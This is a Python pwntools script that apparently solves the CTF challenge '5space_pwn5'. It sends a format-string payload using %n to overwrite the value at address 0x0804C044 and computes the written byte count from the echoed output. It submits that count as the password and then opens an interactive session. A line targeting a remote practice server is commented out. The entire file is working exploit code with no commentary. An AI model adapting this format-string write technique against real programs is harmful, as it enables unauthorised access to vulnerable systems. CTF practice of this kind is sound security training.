#!/usr/bin/python3.6
from pwn import *

elf = ELF("./5space_pwn5")
proc = process("./5space_pwn5")
# proc = remote("node3.buuoj.cn", 25409)

dest = 0x0804C044
payload = b'%x' * 10 + b'%f%f%f%n' + p32(dest)

log.info(proc.recvuntil("your name:"))

proc.sendline(payload)
output = proc.recvuntil(b'your passwd:', drop=True)

output = output.replace(b'Hello,', b'')
log.info(f'output={output};len={len(output)}')
end = output.find(p32(dest))
output = output[:end]
log.success(f'len={len(output)}')

proc.sendline(bytes(f'{len(output)}', encoding='ascii'))
# log.success(proc.recvuntil())
proc.interactive()
